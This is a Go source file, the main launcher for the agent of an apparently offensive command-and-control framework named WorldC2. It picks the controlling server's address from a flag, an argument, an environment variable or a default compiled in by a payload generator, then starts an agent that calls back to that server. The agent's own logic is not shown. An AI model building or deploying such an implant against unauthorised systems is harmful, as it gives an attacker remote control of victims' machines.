package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"syscall"

	"github.com/Ruby570bocadito/WorldC2/src/go/internal/agent"
)

// DefaultServer is overridden at build time via -ldflags "-X main.DefaultServer=IP:PORT"
var DefaultServer = "127.0.0.1:8443"

func main() {
	serverAddr := flag.String("server", "", "C2 server address (host:port)")

	// Also accept positional argument (./worldc2-agent 192.168.1.1:8443)
	flag.Parse()

	addr := *serverAddr

	// Fallback: positional argument
	if addr == "" && flag.NArg() > 0 {
		addr = flag.Arg(0)
	}

	// Fallback: environment variable
	if addr == "" {
		addr = os.Getenv("WORLDC2_SERVER")
	}

	// Fallback: compiled-in default (set by payload generator)
	if addr == "" {
		addr = DefaultServer
	}

	if addr == "" || addr == "AUTO" {
		fmt.Fprintf(os.Stderr, "Usage: agent --server <host:port>\n")
		fmt.Fprintf(os.Stderr, "  or set WORLDC2_SERVER environment variable\n")
		os.Exit(1)
	}

	a := agent.New(addr)

	// Handle graceful shutdown
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-sigCh
		log.Println("[AGENT] Shutting down...")
		a.Stop()
	}()

	log.Printf("[AGENT] Starting agent - connecting to %s", addr)

	if err := a.Run(); err != nil {
		log.Printf("[AGENT] Agent error: %v", err)
		os.Exit(1)
	}

	log.Println("[AGENT] Agent exited.")
}
